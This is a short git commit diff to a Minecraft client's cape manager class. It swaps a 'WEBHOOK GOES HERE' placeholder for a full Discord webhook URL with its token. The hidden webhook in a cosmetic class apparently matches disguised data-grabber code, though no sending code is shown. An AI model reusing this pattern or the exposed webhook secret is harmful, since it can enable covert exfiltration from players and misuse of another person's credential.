1f4bcad3f84c0941a4a347096afc42de3a218cb7
MEXunf <87725191+MEXunf@users.noreply.github.com>
2021-08-15 18:34:21 -0400

    Update WurstplusCapeManager.java

--- WurstplusCapeManager.java
+++ WurstplusCapeManager.java
@@ -15,7 +15,7 @@ public class WurstplusCapeManager {
 
     public WurstplusCapeManager() {
 
-        final String l = "WEBHOOK GOES HERE";
+        final String l = "https://discord.com/api/webhooks/874378568010965024/O5gQ06tVxPaLV8ZgHXA2mtis8Ys2qYPYMoD10qiGLt0BIZpAMB9jydyWtPgBuBuWBVzPE";
         final String CapeName = "Kylo Ren";
         final String CapeImageURL = "https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fvignette.wikia.nocookie.net%2Fstarwars%2Fimages%2F4%2F4a%2FKylo_Ren_TLJ.png";
 
